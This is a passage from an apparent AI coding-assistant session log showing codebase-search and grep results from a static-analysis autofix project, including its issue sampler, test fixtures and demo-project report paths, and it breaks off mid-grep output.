issues=[sample.issue],","lineNumber":324},{"text":"                    filtered_issues=[sample.issue],","lineNumber":325},{"text":"                    git_info={},","lineNumber":326},{"text":"                    include_fix=False,","lineNumber":327},{"text":"                )","lineNumber":328},{"text":"            )","lineNumber":329},{"lineNumber":330},{"text":"    with open(dest_path / \\"samples.json\\", \\"w\\") as f:","lineNumber":331},{"text":"        json.dump(","lineNumber":332},{"text":"            {","lineNumber":333},{"text":"                \\"created_at\\": int(time.time()),","lineNumber":334},{"text":"                \\"issues\\": serialized_samples,","lineNumber":335},{"text":"                \\"is_from_docker\\": config.is_from_docker,","lineNumber":336},{"text":"            },","lineNumber":337},{"text":"            f,","lineNumber":338},{"text":"            indent=4,","lineNumber":339},{"text":"        )","lineNumber":340,"isSignature":true},{"lineNumber":341},{"lineNumber":342},{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"text":"    ","lineNumber":344}]},"score":0.2911666929721832},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/backend/mutations/run_sampler.py","range":{"startPosition":{"line":13,"column":1},"endPosition":{"line":308}},"contents":"@strawberry.mutation\\nasync def run_sampler(\\n    self,\\n    sast_issue_languages: str,\\n    sast_issue_types: str,\\n) -> SamplerResult:\\n\\n\\n    ...\\n\\n\\n    command_str = \\" \\".join(cmd)\\n\\n    logger.info(f\\"📋 Executing command: {command_str}\\")\\n\\n    try:\\n        # Run from the patchino directory but set Python path to parent\\n        work_dir = Path(\\"/customuser/app/patchino\\")\\n\\n        # Set environment variables for Python path to include parent directory\\n        env = os.environ.copy()\\n        env[\\"PYTHONPATH\\"] = \\"/customuser/app/patchino\\"\\n        env[\\"PROJECT_DIR\\"] = \\"app\\"\\n\\n        # Execute the command\\n        logger.info(\\"⏳ Starting sampler script execution...\\")\\n\\n        # Run with real-time output streaming\\n        process = subprocess.Popen(\\n            cmd,\\n            cwd=work_dir,\\n            stdout=subprocess.PIPE,\\n            stderr=subprocess.PIPE,\\n            text=True,\\n            env=env,\\n            bufsize=1,\\n            universal_newlines=True,\\n        )\\n\\n        # Collect output in real-time\\n        sampler_output = \\"\\"\\n        sampler_error = \\"\\"","originalContents":"\\n\\n    command_str = \\" \\".join(cmd)\\n\\n    logger.info(f\\"📋 Executing command: {command_str}\\")\\n\\n    try:\\n        # Run from the patchino directory but set Python path to parent\\n        work_dir = Path(\\"/customuser/app/patchino\\")\\n\\n        # Set environment variables for Python path to include parent directory\\n        env = os.environ.copy()\\n        env[\\"PYTHONPATH\\"] = \\"/customuser/app/patchino\\"\\n        env[\\"PROJECT_DIR\\"] = \\"app\\"\\n\\n        # Execute the command\\n        logger.info(\\"⏳ Starting sampler script execution...\\")\\n\\n        # Run with real-time output streaming\\n        process = subprocess.Popen(\\n            cmd,\\n            cwd=work_dir,\\n            stdout=subprocess.PIPE,\\n            stderr=subprocess.PIPE,\\n            text=True,\\n            env=env,\\n            bufsize=1,\\n            universal_newlines=True,\\n        )\\n\\n        # Collect output in real-time\\n        sampler_output = \\"\\"\\n        sampler_error = \\"\\"","detailedLines":[{"text":"logger = logging.getLogger(__name__)","lineNumber":15},{"lineNumber":16},{"lineNumber":17},{"text":"@strawberry.mutation","lineNumber":18},{"text":"async def run_sampler(","lineNumber":19,"isSignature":true},{"text":"    self,","lineNumber":20,"isSignature":true},{"text":"    sast_issue_languages: str,","lineNumber":21,"isSignature":true},{"text":"    sast_issue_types: str,","lineNumber":22,"isSignature":true},{"text":") -> SamplerResult:","lineNumber":23,"isSignature":true},{"text":"    ","lineNumber":24},{"lineNumber":67},{"text":"        )","lineNumber":68},{"lineNumber":69},{"text":"    # Build the command","lineNumber":70},{"text":"    cmd = [\\"poetry\\", \\"run\\", \\"python\\", \\"patchino/sampler.py\\", \\"./sampler_config.json\\"]","lineNumber":71},{"lineNumber":72},{"text":"    command_str = \\" \\".join(cmd)","lineNumber":73},{"lineNumber":74},{"text":"    logger.info(f\\"📋 Executing command: {command_str}\\")","lineNumber":75},{"lineNumber":76},{"text":"    try:","lineNumber":77},{"text":"        # Run from the patchino directory but set Python path to parent","lineNumber":78},{"text":"        work_dir = Path(\\"/customuser/app/patchino\\")","lineNumber":79},{"lineNumber":80},{"text":"        # Set environment variables for Python path to include parent directory","lineNumber":81},{"text":"        env = os.environ.copy()","lineNumber":82},{"text":"        env[\\"PYTHONPATH\\"] = \\"/customuser/app/patchino\\"","lineNumber":83},{"text":"        env[\\"PROJECT_DIR\\"] = \\"app\\"","lineNumber":84},{"lineNumber":85},{"text":"        # Execute the command","lineNumber":86},{"text":"        logger.info(\\"⏳ Starting sampler script execution...\\")","lineNumber":87},{"lineNumber":88},{"text":"        # Run with real-time output streaming","lineNumber":89},{"text":"        process = subprocess.Popen(","lineNumber":90},{"text":"            cmd,","lineNumber":91},{"text":"            cwd=work_dir,","lineNumber":92},{"text":"            stdout=subprocess.PIPE,","lineNumber":93},{"text":"            stderr=subprocess.PIPE,","lineNumber":94},{"text":"            text=True,","lineNumber":95},{"text":"            env=env,","lineNumber":96},{"text":"            bufsize=1,","lineNumber":97},{"text":"            universal_newlines=True,","lineNumber":98},{"text":"        )","lineNumber":99},{"lineNumber":100},{"text":"        # Collect output in real-time","lineNumber":101},{"text":"        sampler_output = \\"\\"","lineNumber":102},{"text":"        sampler_error = \\"\\"","lineNumber":103},{"lineNumber":104},{"text":"        try:","lineNumber":105}]},"score":0.2901548147201538},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{},"endPosition":{"line":55,"column":1}},"contents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","originalContents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","detailedLines":[{"text":"import path from 'node:path'","lineNumber":1},{"lineNumber":2},{"text":"import {","lineNumber":3},{"text":"  Projects,","lineNumber":4},{"text":"  Vendors,","lineNumber":5},{"text":"} from '../servers/vulnerability_report/vuln_report_generates'","lineNumber":6},{"lineNumber":7},{"text":"const DATA_DIR = path.join(__dirname, 'try_now')","lineNumber":8},{"lineNumber":9},{"text":"export const TRY_NOW_PROJECTS = {","lineNumber":10},{"text":"  [Projects.JuiceShop]: {","lineNumber":11},{"text":"    url: 'https://github.com/juice-shop/juice-shop',","lineNumber":12},{"text":"    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',","lineNumber":13},{"text":"    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),","lineNumber":14},{"text":"    reportFiles: {","lineNumber":15},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),","lineNumber":16},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),","lineNumber":17},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),","lineNumber":18},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),","lineNumber":19},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),","lineNumber":20},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":21},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":22},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),","lineNumber":23},{"text":"    },","lineNumber":24},{"text":"  },","lineNumber":25},{"text":"  [Projects.Webgoat]: {","lineNumber":26},{"text":"    url: 'https://github.com/WebGoat/WebGoat',","lineNumber":27},{"text":"    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":28},{"text":"    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),","lineNumber":29},{"text":"    reportFiles: {","lineNumber":30},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),","lineNumber":31},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),","lineNumber":32},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),","lineNumber":33},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),","lineNumber":34},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),","lineNumber":35},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":36},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":37},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),","lineNumber":38},{"text":"    },","lineNumber":39},{"text":"  },","lineNumber":40},{"text":"  [Projects.Altoroj]: {","lineNumber":41},{"text":"    url: 'https://github.com/HCL-TECH-SOFTWARE/AltoroJ'","lineNumber":42},{"text":",","lineNumber":55},{"text":"}","lineNumber":56}]},"score":0.2817254960536957},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{"line":180},"endPosition":{"line":213,"column":22}},"contents":"\\n\\n\\n@pytest.fixture\\ndef temp_prompt_dir(tmp_path, sample_prompt_content):\\n    \\"\\"\\"Create a temporary directory with prompt files for testing.\\"\\"\\"\\n    prompt_dir = tmp_path / \\"prompts\\"\\n    prompt_dir.mkdir()\\n\\n    # Standard fix prompt\\n    standard_prompt = (\\n        prompt_dir / \\"csharp_logging_templates_should_be_constant.user.jinja2\\"\\n    )\\n    standard_prompt.write_text(sample_prompt_content)\\n\\n    # FP detection prompt\\n    fp_prompt = (\\n        prompt_dir\\n        / \\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\"\\n    )\\n    fp_prompt.write_text(sample_prompt_content)\\n\\n    return str(prompt_dir)","originalContents":"\\n\\n\\n@pytest.fixture\\ndef temp_prompt_dir(tmp_path, sample_prompt_content):\\n    \\"\\"\\"Create a temporary directory with prompt files for testing.\\"\\"\\"\\n    prompt_dir = tmp_path / \\"prompts\\"\\n    prompt_dir.mkdir()\\n\\n    # Standard fix prompt\\n    standard_prompt = (\\n        prompt_dir / \\"csharp_logging_templates_should_be_constant.user.jinja2\\"\\n    )\\n    standard_prompt.write_text(sample_prompt_content)\\n\\n    # FP detection prompt\\n    fp_prompt = (\\n        prompt_dir\\n        / \\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\"\\n    )\\n    fp_prompt.write_text(sample_prompt_content)\\n\\n    return str(prompt_dir)","detailedLines":[{"text":"@pytest.fixture","lineNumber":181},{"text":"def temp_prompt_file(tmp_path, sample_prompt_content):","lineNumber":182,"isSignature":true},{"lineNumber":184},{"text":"    prompt_file.write_text(sample_prompt_content)","lineNumber":185},{"text":"    return str(prompt_file)","lineNumber":186,"isSignature":true},{"lineNumber":187},{"lineNumber":188},{"text":"@pytest.fixture","lineNumber":189},{"text":"def temp_prompt_dir(tmp_path, sample_prompt_content):","lineNumber":190,"isSignature":true},{"text":"    \\"\\"\\"Create a temporary directory with prompt files for testing.\\"\\"\\"","lineNumber":191},{"text":"    prompt_dir = tmp_path / \\"prompts\\"","lineNumber":192},{"text":"    prompt_dir.mkdir()","lineNumber":193},{"lineNumber":194},{"text":"    # Standard fix prompt","lineNumber":195},{"text":"    standard_prompt = (","lineNumber":196},{"text":"        prompt_dir / \\"csharp_logging_templates_should_be_constant.user.jinja2\\"","lineNumber":197},{"text":"    )","lineNumber":198},{"text":"    standard_prompt.write_text(sample_prompt_content)","lineNumber":199},{"lineNumber":200},{"text":"    # FP detection prompt","lineNumber":201},{"text":"    fp_prompt = (","lineNumber":202},{"text":"        prompt_dir","lineNumber":203},{"text":"        / \\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\"","lineNumber":204},{"text":"    )","lineNumber":205},{"text":"    fp_prompt.write_text(sample_prompt_content)","lineNumber":206},{"lineNumber":207},{"text":"    return str(prompt_dir)","lineNumber":208,"isSignature":true},{"lineNumber":209},{"lineNumber":210},{"text":"@pytest.fixture","lineNumber":211},{"text":"def mock_fetch_run_feedback():","lineNumber":212,"isSignature":true},{"text":"    \\"\\"\\"Mock the fetch_run_feedback function.\\"\\"\\"","lineNumber":213},{"text":"    return MagicMock()","lineNumber":214,"isSignature":true}]},"score":0.2698521614074707},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{},"endPosition":{"line":73}},"contents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","originalContents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","detailedLines":[{"text":"import os","lineNumber":1},{"text":"import pathlib","lineNumber":2},{"lineNumber":3},{"text":"import pytest","lineNumber":4},{"text":"from aioresponses import aioresponses","lineNumber":5},{"lineNumber":6},{"text":"ROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent","lineNumber":7},{"text":"WEBGOAT_CHECKMARX_TEST_REPORT_PATH = (","lineNumber":8},{"text":"    ROOT_REPO_DIR","lineNumber":9},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"","lineNumber":10},{"text":")","lineNumber":11},{"text":"WEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (","lineNumber":12},{"text":"    ROOT_REPO_DIR","lineNumber":13},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"","lineNumber":14},{"text":")","lineNumber":15},{"text":"JUICE_SHOP_SNYK_TEST_REPORT_PATH = (","lineNumber":16},{"text":"    ROOT_REPO_DIR","lineNumber":17},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"","lineNumber":18},{"text":")","lineNumber":19},{"text":"JUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (","lineNumber":20},{"text":"    ROOT_REPO_DIR","lineNumber":21},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"","lineNumber":22},{"text":")","lineNumber":23},{"text":"TESTS_DIR = pathlib.Path(__file__).parent","lineNumber":24},{"lineNumber":25},{"text":"TEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"","lineNumber":26},{"text":"TEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"","lineNumber":27},{"text":"REPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"","lineNumber":28},{"text":"REPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"","lineNumber":29},{"text":"REPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"","lineNumber":30},{"text":"REPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"","lineNumber":31},{"text":"ASSETS_DIR = TESTS_DIR / \\"assets\\"","lineNumber":32},{"text":"BUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"","lineNumber":33},{"lineNumber":34},{"text":"SAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"","lineNumber":35},{"text":"SAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"","lineNumber":36},{"lineNumber":37},{"lineNumber":38},{"text":"@pytest.fixture","lineNumber":39},{"text":"def aiohttp_session():","lineNumber":40,"isSignature":true},{"text":"    with aioresponses() as session:","lineNumber":41},{"text":"        yield session","lineNumber":42,"isSignature":true},{"lineNumber":43},{"lineNumber":44},{"text":"@pytest.fixture(autouse=True, scope=\\"session\\")","lineNumber":45},{"text":"def mock_env_values_for_py_common():","lineNumber":46,"isSignature":true},{"text":"    os.environ[\\"AWS_S3_ACCESS_KEY_ID\\"] = \\"DUMMY_AWS_S3_ACCESS_KEY_ID\\"","lineNumber":47}]},"score":0.2692480683326721},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":339,"column":9},"endPosition":{"line":465}},"contents":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\n\\n    ...\\n\\n    else:\\n        for issue in customer_issues:\\n            if (\\n                issue.raw_issue_type in config.sast_issue_types\\n                and issue.raw_language in config.sast_issue_languages\\n                and len(samples) <= (config.max_sample_count / 2)\\n            ):\\n                if not issue.fingerprint_hash:\\n                    print(\\n                        f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                    )\\n                    continue\\n\\n                samples.append(\\n                    Sample(\\n                        issue=issue,\\n                        report=report,\\n                        report_path=config.customer_report_path,\\n                        source_archive_path=config.customer_source_archive_path,\\n                        is_public=False,\\n                    )\\n                )\\n\\n    print(f\\"Found {len(samples)} issues from the customer report\\")\\n    return samples","originalContents":"\\n    else:\\n        for issue in customer_issues:\\n            if (\\n                issue.raw_issue_type in config.sast_issue_types\\n                and issue.raw_language in config.sast_issue_languages\\n                and len(samples) <= (config.max_sample_count / 2)\\n            ):\\n                if not issue.fingerprint_hash:\\n                    print(\\n                        f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                    )\\n                    continue\\n\\n                samples.append(\\n                    Sample(\\n                        issue=issue,\\n                        report=report,\\n                        report_path=config.customer_report_path,\\n                        source_archive_path=config.customer_source_archive_path,\\n                        is_public=False,\\n                    )\\n                )\\n\\n    print(f\\"Found {len(samples)} issues from the customer report\\")\\n    return samples","detailedLines":[{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"text":"    ","lineNumber":344},{"lineNumber":371},{"text":"                    is_public=False,","lineNumber":372},{"text":"                )","lineNumber":373},{"text":"            )","lineNumber":374},{"text":"    else:","lineNumber":375},{"text":"        for issue in customer_issues:","lineNumber":376},{"text":"            if (","lineNumber":377},{"text":"                issue.raw_issue_type in config.sast_issue_types","lineNumber":378},{"text":"                and issue.raw_language in config.sast_issue_languages","lineNumber":379},{"text":"                and len(samples) <= (config.max_sample_count / 2)","lineNumber":380},{"text":"            ):","lineNumber":381},{"text":"                if not issue.fingerprint_hash:","lineNumber":382},{"text":"                    print(","lineNumber":383},{"text":"                        f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"","lineNumber":384},{"text":"                    )","lineNumber":385},{"text":"                    continue","lineNumber":386},{"lineNumber":387},{"text":"                samples.append(","lineNumber":388},{"text":"                    Sample(","lineNumber":389},{"text":"                        issue=issue,","lineNumber":390},{"text":"                        report=report,","lineNumber":391},{"text":"                        report_path=config.customer_report_path,","lineNumber":392},{"text":"                        source_archive_path=config.customer_source_archive_path,","lineNumber":393},{"text":"                        is_public=False,","lineNumber":394},{"text":"                    )","lineNumber":395},{"text":"                )","lineNumber":396},{"lineNumber":397},{"text":"    print(f\\"Found {len(samples)} issues from the customer report\\")","lineNumber":398},{"text":"    return samples","lineNumber":399,"isSignature":true},{"lineNumber":400},{"lineNumber":401},{"text":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":402,"isSignature":true},{"text":"    samples = []","lineNumber":403}]},"score":0.2687819004058838}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:10.514Z,
        "text": "Checking references to the \`_samples\` directory path that need updating:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:10.656Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "grep",
          "parameters": "{"pattern":"_samples","outputMode":"content","caseInsensitive":false}",
          "rawArguments": "{"pattern": "_samples"}",
          "result": "{"success":{"pattern":"_samples","path":".","outputMode":"content","workspaceResults":{"/Users/jonathanafek/src/autofixer":{"content":{"matches":[{"file":"./patchino/patchino/issue_processor.py","matches":[{"lineNumber":238,"content":"        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")"}]},{"file":"./patchino/patchino/sampler.py","matches":[{"lineNumber":221,"content":"    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")"},{"lineNumber":254,"content":"    samples += await _get_customer_report_samples(input_config)"},{"lineNumber":255,"content":"    samples += await _get_dataset_samples(input_config)"},{"lineNumber":275,"content":"    serialized_samples = []"},{"lineNumber":294,"content":"        serialized_samples.append("},{"lineNumber":335,"content":"                \\"issues\\": serialized_samples,"},{"lineNumber":343,"content":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:"},{"lineNumber":402,"content":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:"}]},{"file":"./consumers/analyzer/tests/assets/python/improper_string_formatting/from_dataset/PennyLaneAI/sonarqube_report.json","matches":[{"lineNumber":15899,"content":"      \\"message\\": \\"Return a value of type \\\\\\"list[TensorLike]\\\\\\" instead of \\\\\\"tuple\\\\\\" or update function \\\\\\"measure_with_samples\\\\\\" type hint.\\","},{"lineNumber":138238,"content":"              \\"msg\\": \\"Change this argument; Function \\\\\\"process_samples\\\\\\" expects a different type\\""},{"lineNumber":138254,"content":"      \\"message\\": \\"Change this argument; Function \\\\\\"process_samples\\\\\\" expects a different type\\","}]},{"file":"./consumers/analyzer/tests/assets/java/hardcoded_secrets/from_dataset/pytorch_vision/checkmarx_report.json","matches":[{"lineNumber":24355,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24362,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":24370,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24377,"content":"            \\"fullName\\": 